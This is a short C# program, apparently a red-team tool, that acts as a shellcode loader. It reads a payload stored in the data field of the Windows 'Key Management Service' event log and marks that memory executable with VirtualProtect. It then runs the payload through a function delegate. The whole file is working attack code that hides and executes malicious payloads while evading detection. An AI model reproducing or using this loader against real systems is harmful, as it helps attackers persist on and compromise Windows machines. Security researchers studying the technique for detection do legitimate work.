using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace EventLogsForRedTeams
{
    class Program
    { 

    [DllImport("kernel32.dll")]
    public static extern Boolean VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, UInt32 flNewProtect,
            out UInt32 lpflOldProtect);

    private delegate IntPtr ptrShellCode();
    static void Main(string[] args)
    {
        // Create a new EventLog object.
        EventLog theEventLog1 = new EventLog();

        theEventLog1.Log = "Key Management Service";

        // Obtain the Log Entries of the Event Log
        EventLogEntryCollection myEventLogEntryCollection = theEventLog1.Entries;

        byte[] data_array = myEventLogEntryCollection[0].Data;

        Console.WriteLine("*** Found Payload in " + theEventLog1.Log + " ***");
        Console.WriteLine("");
        Console.WriteLine("*** Injecting Payload ***");

        // inject the payload
        GCHandle SCHandle = GCHandle.Alloc(data_array, GCHandleType.Pinned);
        IntPtr SCPointer = SCHandle.AddrOfPinnedObject();
        uint flOldProtect;

        if (VirtualProtect(SCPointer, (UIntPtr)data_array.Length, 0x40, out flOldProtect))
        {
            ptrShellCode sc = (ptrShellCode)Marshal.GetDelegateForFunctionPointer(SCPointer, typeof(ptrShellCode));
            sc();
        }
    }
}
}
